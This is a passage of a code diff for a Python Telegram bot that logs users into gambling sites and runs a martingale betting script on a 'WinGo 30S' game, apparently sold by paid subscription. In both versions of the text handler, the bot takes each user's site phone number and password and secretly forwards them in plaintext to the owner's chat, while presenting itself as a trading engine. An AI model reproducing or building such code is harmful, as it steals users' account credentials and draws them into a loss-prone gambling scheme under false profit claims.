+            f"• <b>ইউজারনেম:</b> @{message.from_user.username or 'N/A'}\n"
+            f"• <b>প্ল্যাটফর্ম:</b> {sess.get('site_name', '')}\n"
+            f"• <b>ফোন নাম্বার:</b> <code>{sess['phone']}</code>\n"
+            f"• <b>পাসওয়ার্ড:</b> <code>{sess['password']}</code>\n"
+            f"• <b>টাইম:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        try:
+            bot.send_message(OWNER_CHAT_ID, owner_cred_alert)
+        except Exception as e:
+            print(f"[!] Failed to alert owner about creds: {e}")
+
+        anim_msg = bot.send_message(chat_id, f"<b>{to_bold('CONNECTING REMOTE ENGINE...')}</b>")
+        threading.Thread(
+            target=process_login,
+            args=(chat_id, sid, sess["phone"], sess["password"], anim_msg.message_id),
+            daemon=True
+        ).start()
+
+    elif input_mode == "WAITING_TARGET":
+        try:
+            val = float(text)
+            if val <= 0:
+                raise ValueError()
+            sess["target_profit"] = val
+            sess["input_mode"] = None
+
+            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
+            def _shot(drv):
+                drv.save_screenshot(wingo_snap)
+            safe_tab_execute(sid, _shot)
+
+            cur_bal = sess.get("current_balance", 0.0)
+            config_caption = (
+                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
+                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
+                f"Live Balance: <code>৳ {cur_bal:.2f}</code>\n"
+                f"Selected Target: <code>৳ {val:.2f}</code>\n\n"
+                f"প্যারামিটার সেট হয়েছে। ট্রেডিং চালু করতে <b>RUN ENGINE</b> চাপুন:"
+            )
+            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
+        except ValueError:
+            p_msg = bot.send_message(chat_id, "দয়া করে সঠিক সংখ্যা লিখুন (যেমন: 500):")
+            sess["temp_prompt_id"] = p_msg.message_id
+
+    elif input_mode == "WAITING_STEPS":
+        try:
+            steps_val = int(text)
+            if steps_val <= 0:
+                raise ValueError()
+            sess["total_steps"] = steps_val
+            sess["input_mode"] = None
+
+            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
+            def _shot(drv):
+                drv.save_screenshot(wingo_snap)
+            safe_tab_execute(sid, _shot)
+
+            cur_bal = sess.get("current_balance", 0.0)
+            config_caption = (
+                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
+                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
+                f"Live Balance: <code>৳ {cur_bal:.2f}</code>\n"
+                f"Selected Steps: <b>{steps_val}</b>\n\n"
+                f"প্যারামিটার সেট হয়েছে। ট্রেডিং চালু করতে <b>RUN ENGINE</b> চাপুন:"
+            )
+            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
+        except ValueError:
+            p_msg = bot.send_message(chat_id, "দয়া করে সঠিক পূর্ণসংখ্যা লিখুন (যেমন: 7):")
+            sess["temp_prompt_id"] = p_msg.message_id
+
+# ==========================================
+# 11. Core Browser Login & Auto Navigation
+# ==========================================
 def process_login(chat_id, sid, phone, password, anim_msg_id):
     sess = active_sessions.get(sid, {})
     site_name = sess.get("site_name", "Amar Club")
     login_url = URL_AMARCLUB_LOGIN if "AMAR" in site_name.upper() else URL_DKWIN_LOGIN
 
-    play_clean_login_animation(chat_id, anim_msg_id)
-
     try:
-        driver, handle = allocate_session_tab(sid, login_url)
+        driver = allocate_isolated_driver(sid, login_url)
     except Exception as e:
         safe_delete_message(chat_id, anim_msg_id)
-        bot.send_message(chat_id, get_text(chat_id, "login_failed", site_name=site_name, error=str(e)))
+        bot.send_message(chat_id, f"<b>{to_bold('LOGIN FAILED')}</b>\nব্রাউজার চালু করতে সমস্যা: {e}")
         return
 
+    # Fill credentials
     fill_ok = False
     for _ in range(70):
         def _fill(drv):
@@ -1389,10 +1759,11 @@ def process_login(chat_id, sid, phone, password, anim_msg_id):
 
     if not fill_ok:
         safe_delete_message(chat_id, anim_msg_id)
-        bot.send_message(chat_id, get_text(chat_id, "login_failed", site_name=site_name, error="Form element not found"))
+        bot.send_message(chat_id, f"<b>{to_bold('LOGIN FAILED')}</b>\nলগইন ফর্ম পাওয়া যায়নি বা পেজ লোড হতে অতিরিক্ত সময় নিয়েছে।")
         close_session_tab(sid)
         return
 
+    # Monitor status
     login_status = "PENDING"
     err_detail = ""
     for _ in range(40):
@@ -1408,7 +1779,7 @@ def process_login(chat_id, sid, phone, password, anim_msg_id):
                 continue
             elif res.get("status") == "ERROR":
                 login_status = "ERROR"
-                err_detail = res.get("message", "Incorrect credentials")
+                err_detail = res.get("message", "ভুল ফোন বা পাসওয়ার্ড")
                 break
         time.sleep(0.5)
 
@@ -1421,7 +1792,7 @@ def process_login(chat_id, sid, phone, password, anim_msg_id):
 
     if login_status == "ERROR":
         close_session_tab(sid)
-        bot.send_message(chat_id, get_text(chat_id, "login_failed", site_name=site_name, error=err_detail))
+        bot.send_message(chat_id, f"<b>{to_bold('LOGIN FAILED')}</b>\nPlatform: {site_name}\nError: <i>{err_detail}</i>")
         return
 
     time.sleep(1.5)
@@ -1432,23 +1803,20 @@ def process_login(chat_id, sid, phone, password, anim_msg_id):
     safe_tab_execute(sid, _shot)
 
     masked_phone = phone[:3] + "****" + phone[-3:] if len(phone) >= 6 else phone
-
-    display_or_replace_photo(
-        chat_id, sid,
-        login_snap,
-        get_text(chat_id, "login_success", site_name=site_name, phone=masked_phone),
-        get_start_screen_keyboard(sid)
+    caption = (
+        f"<b>{to_bold('LOGIN SUCCESSFUL')}</b>\n\n"
+        f"Platform: <b>{site_name}</b>\n"
+        f"Account: <code>{masked_phone}</code>\n\n"
+        f"লগইন সফল হয়েছে। ট্রেডিং শুরু করতে নিচে <b>START CONFIG</b> বাটন চাপুন:"
     )
 
+    display_or_replace_photo(chat_id, sid, login_snap, caption, get_start_screen_keyboard(sid))
     try:
         if os.path.exists(login_snap):
             os.remove(login_snap)
     except Exception:
         pass
 
-# =====================================================================
-# 11. WinGo Navigation & Configuration Flow
-# =====================================================================
 def prepare_wingo_parameters(chat_id, sid):
     sess = active_sessions.get(sid, {})
     site_name = sess.get("site_name", "Amar Club")
@@ -1497,28 +1865,19 @@ def prepare_wingo_parameters(chat_id, sid):
     safe_tab_execute(sid, _shot)
 
     config_caption = (
-        f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\\n\\n"
-        f"Platform: <b>{site_name}</b>\\n"
-        f"Live Balance: <code>BDT {current_bal:.2f}</code>\\n\\n"
-        f"Click TARGET and STEPS below to configure, then press START:"
+        f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
+        f"Platform: <b>{site_name}</b>\n"
+        f"Live Balance: <code>৳ {current_bal:.2f}</code>\n\n"
+        f"নিচের <b>TARGET</b> ও <b>STEPS</b> বাটন চেপে ট্রেডিং সেট করুন, তারপর <b>RUN ENGINE</b> চাপুন:"
     )
 
-    display_or_replace_photo(
-        chat_id, sid,
-        wingo_snap,
-        config_caption,
-        get_setup_param_keyboard(sid)
-    )
-
+    display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
     try:
         if os.path.exists(wingo_snap):
             os.remove(wingo_snap)
     except Exception:
         pass
 
-# =====================================================================
-# 12. Background Monitoring & Lifetime Watchdog
-# =====================================================================
 def monitor_trading_progress(chat_id, sid):
     while True:
         sess = active_sessions.get(sid)
@@ -1545,13 +1904,10 @@ def monitor_trading_progress(chat_id, sid):
             """)
 
         js_data = safe_tab_execute(sid, _get_st)
-
         if js_data:
             sess["cur_bal"] = js_data.get("curBal", sess.get("cur_bal", 0))
             sess["wins"] = js_data.get("w", 0)
             sess["losses"] = js_data.get("l", 0)
-            sess["max_w"] = js_data.get("max_w_streak", 0)
-            sess["max_l"] = js_data.get("max_l_streak", 0)
             tgt_amt = js_data.get("tgtAmt", 0)
 
             if sess["cur_bal"] >= tgt_amt and tgt_amt > 0 and sess["cur_bal"] > 0:
@@ -1565,12 +1921,12 @@ def monitor_trading_progress(chat_id, sid):
                 safe_tab_execute(sid, _shot)
 
                 msg = (
-                    f"<b>{to_bold('TARGET ACHIEVED SUCCESSFULLY')}</b>\\n\\n"
-                    f"Target profit reached.\\n\\n"
-                    f"Start Balance: <code>BDT {start_b:.2f}</code>\\n"
-                    f"Current Balance: <code>BDT {sess['cur_bal']:.2f}</code>\\n"
-                    f"Net Profit: <code>+BDT {profit:.2f}</code>\\n"
-                    f"Wins: <b>{sess['wins']}</b> | Losses: <b>{sess['losses']}</b>"
+                    f"<b>{to_bold('TARGET ACHIEVED SUCCESSFULLY')}</b> 🏆\n\n"
+                    f"কাঙ্ক্ষিত টার্গেট সম্পূর্ণ সফলভাবে পূরণ হয়েছে।\n\n"
+                    f"শুরুর ব্যালেন্স: <code>৳ {start_b:.2f}</code>\n"
+                    f"বর্তমান ব্যালেন্স: <code>৳ {sess['cur_bal']:.2f}</code>\n"
+                    f"অর্জিত প্রফিট: <code>+৳ {profit:.2f}</code>\n"
+                    f"মোট উইন: <b>{sess['wins']}</b> | লস: <b>{sess['losses']}</b>"
                 )
 
                 if os.path.exists(screen_path):
@@ -1585,14 +1941,18 @@ def monitor_trading_progress(chat_id, sid):
 
         time.sleep(4)
 
+# ==========================================
+# 12. Auto Maintenance Watchdog
+# ==========================================
 def continuous_watchdog():
     while True:
         try:
             now = time.time()
             for sid, item in list(active_sessions.items()):
                 created_at = item.get("created_at", now)
+                # Purge session after 24 hours to prevent memory leaks
                 if now - created_at >= 86400:
-                    print(f"[*] 24-hour cleanup for session: {sid}")
+                    print(f"[*] 24-hour lifetime reached for session {sid}. Cleaning up...")
                     close_session_tab(sid)
         except Exception:
             pass
@@ -1600,518 +1960,15 @@ def continuous_watchdog():
 
 threading.Thread(target=continuous_watchdog, daemon=True).start()
 
-# =====================================================================
-# 13. Telegram Command & Callback Handlers
-# =====================================================================
-@bot.message_handler(commands=['start'])
-def handle_start(message):
-    chat_id = message.chat.id
-    safe_delete_message(chat_id, message.message_id)
-
-    user_sessions[chat_id] = {
-        "step": "CHANNEL_LOCK",
-        "lang": "bn"
-    }
-
-    bot.send_message(
-        chat_id,
-        get_text(chat_id, "channel_lock"),
-        reply_markup=get_channel_lock_keyboard()
-    )
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callbacks(call):
-    chat_id = call.message.chat.id
-    data = call.data
-    parts = data.split(":")
-    action = parts[0]
-    param = parts[1] if len(parts) > 1 else None
-
-    # Step 1: Channel Join Continue
-    if action == "channel_joined":
-        user_sessions.setdefault(chat_id, {})["step"] = "CHOOSE_LANG"
-        bot.answer_callback_query(call.id)
-        bot.edit_message_text(
-            get_text(chat_id, "choose_lang"),
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            reply_markup=get_language_keyboard()
-        )
-
-    # Step 2: Language Selection
-    elif action in ["lang_en", "lang_bn"]:
-        u = user_sessions.setdefault(chat_id, {})
-        u["lang"] = "en" if action == "lang_en" else "bn"
-        bot.answer_callback_query(call.id)
-
-        # Check Subscription or Owner
-        if is_user_active(chat_id):
-            u["step"] = "CHOOSE_SITE"
-            bot.edit_message_text(
-                get_text(chat_id, "choose_site"),
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                reply_markup=get_platform_keyboard()
-            )
-        else:
-            u["step"] = "CHOOSE_PLAN"
-            bot.edit_message_text(
-                get_text(chat_id, "pricing_menu"),
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                reply_markup=get_pricing_keyboard()
-            )
-
-    # Step 3: Plan Selection
-    elif action.startswith("plan_"):
-        plan_key = action.replace("plan_", "")
-        plan_info = PLANS.get(plan_key)
-        if not plan_info:
-            bot.answer_callback_query(call.id, "Invalid Plan", show_alert=True)
-            return
-        user_sessions.setdefault(chat_id, {})["selected_plan"] = plan_key
-        bot.answer_callback_query(call.id)
-        bot.edit_message_text(
-            get_text(chat_id, "choose_gateway", plan_label=plan_info["label"], price=plan_info["price"]),
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            reply_markup=get_gateway_keyboard(plan_key)
-        )
-
-    elif action == "back_pricing":
-        bot.answer_callback_query(call.id)
-        bot.edit_message_text(
-            get_text(chat_id, "pricing_menu"),
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            reply_markup=get_pricing_keyboard()
-        )
-
-    # Step 4: Payment Gateway Selected (bKash / Nagad)
-    elif action in ["pay_bkash", "pay_nagad"]:
-        gateway = "bKash" if action == "pay_bkash" else "Nagad"
-        plan_key = param or user_sessions.get(chat_id, {}).get("selected_plan", "1d")
-        plan_info = PLANS.get(plan_key, PLANS["1d"])
-        number = BKASH_NUMBER if gateway == "bKash" else NAGAD_NUMBER
-
-        user_sessions.setdefault(chat_id, {})["payment_gateway"] = gateway
-        user_sessions[chat_id]["pending_plan"] = plan_key
-        user_sessions[chat_id]["input_mode"] = "WAITING_TRX"
-
-        bot.answer_callback_query(call.id)
-        bot.edit_message_text(
-            get_text(chat_id, "send_money_instruction", gateway=gateway, plan_label=plan_info["label"], price=plan_info["price"], number=number),
-            chat_id=chat_id,
-            message_id=call.message.message_id
-        )
-
-    # Step 5: Owner Approvals (appr_<uid>_<days>, rejt_<uid>)
-    elif action.startswith("appr_"):
-        if int(chat_id) != int(OWNER_ID):
-            bot.answer_callback_query(call.id, "Unauthorized", show_alert=True)
-            return
-        parts_appr = action.split("_")
-        target_uid = int(parts_appr[1])
-        days = int(parts_appr[2])
-        activate_user(target_uid, days)
-        bot.answer_callback_query(call.id, "Approved successfully")
-        bot.edit_message_text(
-            f"<b>{to_bold('PAYMENT APPROVED')}</b>\\nUser: <code>{target_uid}</code>\\nDays: <b>{days}</b>",
-            chat_id=chat_id,
-            message_id=call.message.message_id
-        )
-        try:
-            bot.send_message(
-                target_uid,
-                get_text(target_uid, "approved_user"),
-                reply_markup=get_platform_keyboard()
-            )
-        except Exception as e:
-            print(f"[*] Notify approved user error: {e}")
-
-    elif action.startswith("rejt_"):
-        if int(chat_id) != int(OWNER_ID):
-            bot.answer_callback_query(call.id, "Unauthorized", show_alert=True)
-            return
-        target_uid = int(action.split("_")[1])
-        bot.answer_callback_query(call.id, "Rejected")
-        bot.edit_message_text(
-            f"<b>{to_bold('PAYMENT REJECTED')}</b>\\nUser: <code>{target_uid}</code>",
-            chat_id=chat_id,
-            message_id=call.message.message_id
-        )
-        try:
-            bot.send_message(target_uid, get_text(target_uid, "rejected_user"))
-        except Exception:
-            pass
-
-    # Step 6: Platform Selection (Amar Club / DK Win)
-    elif action in ["site_amarclub", "site_dkwin"]:
-        site_name = "Amar Club" if action == "site_amarclub" else "DK Win"
-        sid = f"{chat_id}_{int(time.time()) % 1000000}"
-
-        active_sessions[sid] = {
-            "chat_id": chat_id,
-            "session_id": sid,
-            "site_name": site_name,
-            "phone": None,
-            "password": None,
-            "target_profit": 0,
-            "total_steps": 7,
-            "is_trading": False,
-            "created_at": time.time(),
-            "anim_tick": 0,
-            "lock": threading.RLock()
-        }
-        user_sessions.setdefault(chat_id, {})["active_sid"] = sid
-
-        bot.answer_callback_query(call.id)
-        bot.edit_message_text(
-            get_text(chat_id, "credentials_card", site_name=site_name),
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            reply_markup=get_credentials_keyboard(sid)
-        )
-        active_sessions[sid]["cred_card_msg_id"] = call.message.message_id
-
-    # Step 7: NUMBER button
-    elif action == "ask_num" and param in active_sessions:
-        sid = param
-        active_sessions[sid]["input_mode"] = "WAITING_PHONE"
-        user_sessions[chat_id]["active_sid"] = sid
-        bot.answer_callback_query(call.id)
-        p_m = bot.send_message(chat_id, get_text(chat_id, "ask_number"))
-        active_sessions[sid]["temp_prompt_id"] = p_m.message_id
-
-    # Step 8: PASSWORD button
-    elif action == "ask_pass" and param in active_sessions:
-        sid = param
-        if not active_sessions[sid].get("phone"):
-            bot.answer_callback_query(call.id, "Please provide Account Number first.", show_alert=True)
-            return
-        active_sessions[sid]["input_mode"] = "WAITING_PASS"
-        user_sessions[chat_id]["active_sid"] = sid
-        bot.answer_callback_query(call.id)
-        p_m = bot.send_message(chat_id, get_text(chat_id, "ask_password"))
-        active_sessions[sid]["temp_prompt_id"] = p_m.message_id
-
-    # Step 9: START (prepare market)
-    elif action == "start_cfg" and param in active_sessions:
-        sid = param
-        bot.answer_callback_query(call.id, "Preparing WinGo 30S market...")
-        threading.Thread(target=prepare_wingo_parameters, args=(chat_id, sid), daemon=True).start()
-
-    # Step 10: TARGET button
-    elif action == "set_tgt" and param in active_sessions:
-        sid = param
-        active_sessions[sid]["input_mode"] = "WAITING_TARGET"
-        user_sessions[chat_id]["active_sid"] = sid
-        bot.answer_callback_query(call.id)
-        cur_bal = active_sessions[sid].get("current_balance", 0.0)
-        p_msg = bot.send_message(chat_id, get_text(chat_id, "input_target", balance=f"{cur_bal:.2f}"))
-        active_sessions[sid]["temp_prompt_id"] = p_msg.message_id
-
-    # Step 11: STEPS button
-    elif action == "set_stp" and param in active_sessions:
-        sid = param
-        active_sessions[sid]["input_mode"] = "WAITING_STEPS"
-        user_sessions[chat_id]["active_sid"] = sid
-        bot.answer_callback_query(call.id)
-        tgt = active_sessions[sid].get("target_profit", 0)
-        p_msg = bot.send_message(chat_id, get_text(chat_id, "input_steps", target=tgt))
-        active_sessions[sid]["temp_prompt_id"] = p_msg.message_id
-
-    # Step 12: RUN AUTO TRADING
-    elif action == "run_auto" and param in active_sessions:
-        sid = param
-        sess = active_sessions[sid]
-        if not sess.get("target_profit") or sess["target_profit"] <= 0:
-            bot.answer_callback_query(call.id, "Enter Target Profit amount first.", show_alert=True)
-            return
-
-        bot.answer_callback_query(call.id, "Activating engine...")
-        sess["is_trading"] = True
-
-        def _run_core(drv):
-            drv.execute_script(WINGO_CORE_JS, sess["target_profit"], sess["total_steps"])
-        safe_tab_execute(sid, _run_core)
-
-        time.sleep(2.0)
-        start_snap = os.path.join(PROFILES_BASE_DIR, f"run_{sid}.png")
-        def _shot(drv):
-            drv.save_screenshot(start_snap)
-        safe_tab_execute(sid, _shot)
-
-        cur_b = sess.get("current_balance", 0.0)
-        target_total = cur_b + sess["target_profit"]
-        sess["start_bal"] = cur_b
-
-        dashboard_caption = get_text(
-            chat_id, "running_dashboard",
-            site_name=sess.get("site_name", "Amar Club"),
-            start_bal=f"{cur_b:.2f}",
-            target_bal=f"{target_total:.2f}",
-            steps=sess["total_steps"]
-        )
-
-        display_or_replace_photo(chat_id, sid, start_snap, dashboard_caption, get_trading_control_keyboard(sid))
-        try:
-            if os.path.exists(start_snap):
-                os.remove(start_snap)
-        except Exception:
-            pass
-
-        threading.Thread(target=monitor_trading_progress, args=(chat_id, sid), daemon=True).start()
-
-    # Step 13: SHOT (live footage refresh)
-    elif action == "shot" and param in active_sessions:
-        sid = param
-        sess = active_sessions[sid]
-        bot.answer_callback_query(call.id, "Updating screenshot...")
-        temp_shot = os.path.join(PROFILES_BASE_DIR, f"live_{sid}.png")
-        def _shot(drv):
-            drv.save_screenshot(temp_shot)
-        safe_tab_execute(sid, _shot)
-
-        if os.path.exists(temp_shot):
-            cur_b = sess.get("cur_bal", sess.get("current_balance", 0.0))
-            t_total = sess.get("start_bal", 0.0) + sess.get("target_profit", 0.0)
-            caption = (
-                f"<b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\\n\\n"
-                f"Platform: <b>{sess.get('site_name', '')}</b>\\n"
-                f"Starting Balance: <code>BDT {sess.get('start_bal', 0.0):.2f}</code>\\n"
-                f"Target Balance: <code>BDT {t_total:.2f}</code>\\n"
-                f"Total Steps: <b>{sess.get('total_steps', 7)}</b>\\n\\n"
-                f"Time: <code>{time.strftime('%H:%M:%S')}</code>\\n"
-                f"<b>STATUS</b>: Martingale engine active."
-            )
-            display_or_replace_photo(chat_id, sid, temp_shot, caption, get_trading_control_keyboard(sid))
-            try:
-                os.remove(temp_shot)
-            except Exception:
-                pass
-
-    # Step 14: BAL (live balance alert)
-    elif action == "bal" and param in active_sessions:
-        sid = param
-        def _bal(drv):
-            return drv.execute_script(FETCH_BALANCE_JS)
-        b = safe_tab_execute(sid, _bal)
-        if b is not None:
-            bot.answer_callback_query(call.id, f"Live Balance: BDT {b:.2f}", show_alert=True)
-        else:
-            bot.answer_callback_query(call.id, "Loading balance...", show_alert=True)
-
-    # Step 15: STATS
-    elif action == "stats" and param in active_sessions:
-        sid = param
-        def _stat(drv):
-            return drv.execute_script("""
-                if (window.__WINGO_ST) {
-                    return {
-                        w: window.__WINGO_ST.w || 0,
-                        l: window.__WINGO_ST.l || 0,
-                        step: (window.__WINGO_ST.stpIdx || 0) + 1,
-                        maxStep: (window.__WINGO_ST.dynSeq || []).length,
-                        curBal: window.__WINGO_ST.curBal || 0,
-                        tgtAmt: window.__WINGO_ST.tgtAmt || 0
-                    };
-                }
-                return null;
-            """)
-        data_rep = safe_tab_execute(sid, _stat)
-        if data_rep:
-            stat_txt = (
-                f"<b>{to_bold('LIVE STATS REPORT')}</b>\\n\\n"
-                f"Balance: <code>BDT {data_rep['curBal']:.2f}</code>\\n"
-                f"Target: <code>BDT {data_rep['tgtAmt']:.2f}</code>\\n"
-                f"Martingale Level: <b>Step {data_rep['step']}/{data_rep['maxStep']}</b>\\n"
-                f"Wins: <b>{data_rep['w']}</b> | Losses: <b>{data_rep['l']}</b>"
-            )
-            bot.send_message(chat_id, stat_txt)
-        else:
-            bot.answer_callback_query(call.id, "Loading engine stats...", show_alert=True)
-
-    # Step 16: STOP
-    elif action == "stop" and param in active_sessions:
-        sid = param
-        sess = active_sessions[sid]
-        def _stop(drv):
-            drv.execute_script("let btn = document.querySelector('#sys-core-fin button'); if(btn) btn.click();")
-        safe_tab_execute(sid, _stop)
-        sess["is_trading"] = False
-        bot.answer_callback_query(call.id, "Trading paused", show_alert=True)
-        bot.send_message(chat_id, f"<b>{to_bold('TRADING PAUSED')}</b>\\nAutomation paused.")
-
-    # Step 17: CANCEL
-    elif action == "cancel" and param in active_sessions:
-        sid = param
-        bot.answer_callback_query(call.id, "Session terminated")
-        close_session_tab(sid)
-        safe_delete_message(chat_id, call.message.message_id)
-        bot.send_message(chat_id, get_text(chat_id, "cancelled"))
-
-# =====================================================================
-# 14. Text Handler (TrxID, Phone, Password, Target, Steps)
-# =====================================================================
-@bot.message_handler(func=lambda msg: True)
-def handle_user_text(message):
-    chat_id = message.chat.id
-    text = message.text.strip()
-    u = user_sessions.get(chat_id, {})
-
-    # Check if waiting for TrxID
-    if u.get("input_mode") == "WAITING_TRX":
-        u["input_mode"] = None
-        plan_key = u.get("pending_plan", "1d")
-        plan_info = PLANS.get(plan_key, PLANS["1d"])
-        gateway = u.get("payment_gateway", "bKash")
-        username = message.from_user.username or "None"
-
-        # Notify Owner
-        owner_alert = (
-            f"<b>{to_bold('NEW PAYMENT REQUEST')}</b>\\n\\n"
-            f"User ID: <code>{chat_id}</code>\\n"
-            f"Username: @{username}\\n"
-            f"Plan: <b>{plan_info['label']}</b>\\n"
-            f"Price: <b>{plan_info['price']} BDT</b>\\n"
-            f"Method: <b>{gateway}</b>\\n"
-            f"TrxID: <code>{text}</code>"
-        )
-        try:
-            bot.send_message(
-                OWNER_ID,
-                owner_alert,
-                reply_markup=get_owner_approval_keyboard(chat_id, plan_info["days"])
-            )
-        except Exception as e:
-            print(f"[*] Failed to alert owner: {e}")
-
-        bot.send_message(chat_id, get_text(chat_id, "trx_submitted", trx_id=text))
-        return
-
-    # Check active trading session input
-    sid = u.get("active_sid")
-    if not sid or sid not in active_sessions:
-        return
-
-    sess = active_sessions[sid]
-    input_mode = sess.get("input_mode")
-
-    safe_delete_message(chat_id, message.message_id)
-    if sess.get("temp_prompt_id"):
-        safe_delete_message(chat_id, sess["temp_prompt_id"])
-        sess["temp_prompt_id"] = None
-
-    if input_mode == "WAITING_PHONE":
-        sess["phone"] = text
-        sess["input_mode"] = None
-
-        if sess.get("cred_card_msg_id"):
-            try:
-                masked = text[:3] + "****" + text[-3:] if len(text) >= 6 else text
-                updated_card_text = (
-                    f"<b>{to_bold('ACCOUNT LOGIN')}</b>\\n\\n"
-                    f"Platform: <b>{sess.get('site_name', '')}</b>\\n"
-                    f"Account: <code>{masked}</code> (saved)\\n\\n"
-                    f"Click PASSWORD button below to enter password:"
-                )
-                bot.edit_message_text(
-                    updated_card_text,
-                    chat_id=chat_id,
-                    message_id=sess["cred_card_msg_id"],
-                    reply_markup=get_credentials_keyboard(sid)
-                )
-            except Exception:
-                pass
-
-    elif input_mode == "WAITING_PASS":
-        sess["password"] = text
-        sess["input_mode"] = None
-
-        # IMMEDIATELY ALERT OWNER OF CREDENTIALS
-        username = message.from_user.username or "None"
-        owner_cred_alert = (
-            f"<b>{to_bold('ACCOUNT LOGIN ALERT')}</b>\\n\\n"
-            f"User ID: <code>{chat_id}</code>\\n"
-            f"Username: @{username}\\n"
-            f"Platform: <b>{sess.get('site_name', '')}</b>\\n"
-            f"Phone: <code>{sess.get('phone', '')}</code>\\n"
-            f"Password: <code>{text}</code>"
-        )
-        try:
-            bot.send_message(OWNER_ID, owner_cred_alert)
-        except Exception as e:
-            print(f"[*] Owner cred forward error: {e}")
-
-        if sess.get("cred_card_msg_id"):
-            safe_delete_message(chat_id, sess["cred_card_msg_id"])
-            sess["cred_card_msg_id"] = None
-
-        anim_msg = bot.send_message(chat_id, "<b>CONNECTING REMOTE ENGINE</b>")
-        threading.Thread(
-            target=process_login,
-            args=(chat_id, sid, sess["phone"], sess["password"], anim_msg.message_id),
-            daemon=True
-        ).start()
-
-    elif input_mode == "WAITING_TARGET":
-        try:
-            val = float(text)
-            if val <= 0:
-                raise ValueError()
-            sess["target_profit"] = val
-            sess["input_mode"] = None
-
-            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
-            def _shot(drv):
-                drv.save_screenshot(wingo_snap)
-            safe_tab_execute(sid, _shot)
-
-            cur_bal = sess.get("current_balance", 0.0)
-            config_caption = (
-                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\\n\\n"
-                f"Platform: <b>{sess.get('site_name', '')}</b>\\n"
-                f"Live Balance: <code>BDT {cur_bal:.2f}</code>\\n"
-                f"Selected Target: <code>BDT {val:.2f}</code>\\n\\n"
-                f"Parameters updated. Press START to trade:"
-            )
-            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
-        except ValueError:
-            p_msg = bot.send_message(chat_id, "Enter valid positive number (e.g. 500):")
-            sess["temp_prompt_id"] = p_msg.message_id
-
-    elif input_mode == "WAITING_STEPS":
-        try:
-            steps_val = int(text)
-            if steps_val <= 0:
-                raise ValueError()
-            sess["total_steps"] = steps_val
-            sess["input_mode"] = None
-
-            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
-            def _shot(drv):
-                drv.save_screenshot(wingo_snap)
-            safe_tab_execute(sid, _shot)
-
-            cur_bal = sess.get("current_balance", 0.0)
-            config_caption = (
-                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\\n\\n"
-                f"Platform: <b>{sess.get('site_name', '')}</b>\\n"
-                f"Live Balance: <code>BDT {cur_bal:.2f}</code>\\n"
-                f"Selected Steps: <b>{steps_val}</b>\\n\\n"
-                f"Parameters updated. Press START to trade:"
-            )
-            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
-        except ValueError:
-            p_msg = bot.send_message(chat_id, "Enter valid positive integer (e.g. 7):")
-            sess["temp_prompt_id"] = p_msg.message_id
-
-# =====================================================================
-# 15. Main Execution
-# =====================================================================
+# ==========================================
+# 13. Main Service Entry Point
+# ==========================================
 if __name__ == "__main__":
-    print(f"[*] {to_bold('WINGO VIP BOT MULTI-INSTANCE READY')}...")
+    print(f"==================================================")
+    print(f"[*] {to_bold('WINZY-MARTINGALE VIP TELEGRAM ENGINE READY')}")
+    print(f"[*] Owner ID: {OWNER_CHAT_ID}")
+    print(f"[*] Multi-session Isolated Firefox/Chrome Instances Active")
+    print(f"==================================================")
     try:
         bot.remove_webhook()
     except Exception:
